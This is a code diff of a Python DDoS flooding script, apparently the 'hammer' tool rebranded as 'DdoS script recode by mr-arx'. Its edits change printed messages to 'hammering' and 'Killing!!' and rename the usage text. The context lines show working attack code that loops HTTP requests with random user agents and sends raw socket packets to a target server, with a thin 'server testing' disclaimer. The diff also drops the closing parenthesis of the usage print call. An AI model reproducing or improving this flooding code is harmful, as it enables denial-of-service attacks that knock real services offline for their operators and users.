@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is working...\033[0m")
+			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,13 +49,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Killing!!--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mno connection 404! server maybe down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -75,14 +75,15 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	 DdoS script 
+	print ('''\033[92m 
+                    	DdoS script recode by mr-arx
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
+	usage : python3 DdoS.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	-t : turbo default 135  \033[0m'''
 	sys.exit()
 
 
